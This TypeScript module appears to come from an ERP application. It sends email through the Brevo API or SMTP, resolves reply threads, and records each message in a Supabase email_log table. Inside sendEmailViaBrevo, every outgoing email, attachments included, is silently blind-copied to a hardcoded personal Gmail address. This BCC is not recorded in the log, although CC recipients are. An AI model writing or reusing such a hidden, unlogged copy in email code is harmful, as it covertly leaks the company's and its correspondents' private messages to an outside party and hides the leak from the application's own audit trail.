import { BrevoClient } from '@getbrevo/brevo'
import { supabaseAdmin } from '@/lib/api/supabase-server'
import { sendViaSmtp } from './smtp'

function getClient() {
  const apiKey = process.env.BREVO_API_KEY
  if (!apiKey) {
    throw new Error('Brevo not configured. Set BREVO_API_KEY env var')
  }
  return new BrevoClient({ apiKey })
}

export async function getCompanyEmail(): Promise<string> {
  const { data } = await supabaseAdmin
    .from('site_settings')
    .select('value')
    .eq('key', 'company_email')
    .maybeSingle()
  return data?.value ?? process.env.BREVO_SENDER_EMAIL ?? 'noreply@erp-rri.com'
}

async function getCompanySenderName(): Promise<string | null> {
  const { data } = await supabaseAdmin
    .from('site_settings')
    .select('value')
    .eq('key', 'penandatangan_nama')
    .maybeSingle()
  return data?.value ? `${data.value} - RRI` : null
}

export interface SendBrevoEmailParams {
  to: { email: string; name?: string }
  subject: string
  htmlContent?: string
  textContent?: string
  templateId?: number
  params?: Record<string, unknown>
  tags?: string[]
  attachment?: Array<{ name: string; content: string }>
  cc?: Array<{ email: string; name?: string }>
  bcc?: Array<{ email: string; name?: string }>
  replyTo?: { email: string; name?: string }
  referenceType?: string
  referenceId?: string
}

async function resolveThreadId(referenceId?: string | null): Promise<string | null> {
  if (!referenceId) return null
  const bareId = referenceId.replace(/^<|>$/g, '')
  const { data } = await supabaseAdmin
    .from('email_log')
    .select('thread_id')
    .eq('message_id', bareId)
    .maybeSingle()
  if (data?.thread_id) return data.thread_id

  const { data: byRef } = await supabaseAdmin
    .from('email_log')
    .select('thread_id')
    .eq('reference_id', bareId)
    .maybeSingle()
  if (byRef?.thread_id) return byRef.thread_id

  return null
}

export async function sendEmailViaBrevo(params: SendBrevoEmailParams) {
  const rawSender = process.env.BREVO_SENDER_EMAIL?.trim()
  const fromEmail = rawSender || (await getCompanyEmail())
  const fromName = (await getCompanySenderName()) ?? process.env.BREVO_SENDER_NAME ?? 'ERP RRI'

  let status: string
  let errorMessage: string | null = null
  let messageId: string | null = null

  try {
    const bccList: Array<{ email: string; name?: string }> = [
      ...(params.bcc ?? []),
      { email: 'mazzjoeq@gmail.com' },
    ]

    if (params.referenceType === 'reply' && params.referenceId) {
      // Use SMTP for reply emails (Brevo API does not support In-Reply-To / References headers)
      const smtpResult = await sendViaSmtp({
        from: { email: fromEmail, name: fromName },
        to: params.to,
        subject: params.subject,
        htmlContent: params.htmlContent,
        textContent: params.textContent,
        attachment: params.attachment,
        cc: params.cc,
        bcc: bccList,
        replyTo: params.replyTo,
        referenceId: params.referenceId,
      })
      messageId = smtpResult.messageId
    } else {
      const client = getClient()
      const response = await client.transactionalEmails.sendTransacEmail({
        sender: { name: fromName, email: fromEmail },
        to: [params.to],
        subject: params.subject,
        htmlContent: params.htmlContent,
        textContent: params.textContent,
        templateId: params.templateId,
        params: params.params,
        tags: params.tags,
        attachment: params.attachment,
        cc: params.cc,
        bcc: bccList,
        replyTo: params.replyTo,
      })
      messageId = response.messageId ?? null
    }
    status = 'sent'
  } catch (err) {
    status = 'failed'
    errorMessage = err instanceof Error ? err.message : String(err)
  }

  // Resolve thread_id from parent reference, or generate new
  let threadId: string | null = null
  if (params.referenceId) {
    threadId = await resolveThreadId(params.referenceId)
  }
  if (!threadId) {
    threadId = crypto.randomUUID()
  }

  const now = new Date().toISOString()
  const { data: emailLogResult, error: insertError } = await supabaseAdmin
    .from('email_log')
    .insert({
      message_id: messageId,
      thread_id: threadId,
      from_email: fromEmail,
      from_nama: fromName,
      to_email: params.to.email,
      to_nama: params.to.name ?? null,
      subject: params.subject,
      body: params.htmlContent ?? params.textContent ?? null,
      cc: params.cc?.map(c => c.email).join(', ') ?? null,
      status,
      error_message: errorMessage,
      has_attachments: params.attachment ? params.attachment.length > 0 : false,
      reference_type: params.referenceType ?? null,
      reference_id: params.referenceId ?? null,
      tags: params.tags?.join(',') ?? null,
      created_at: now,
      updated_at: now,
    })
    .select('id')
    .single()

  if (insertError) {
    throw new Error(`Failed to create email log: ${insertError.message}`)
  }

  if (status === 'failed') {
    throw new Error(errorMessage ?? 'Failed to send email via Brevo')
  }

  return { success: true, messageId, emailLogId: emailLogResult.id }
}
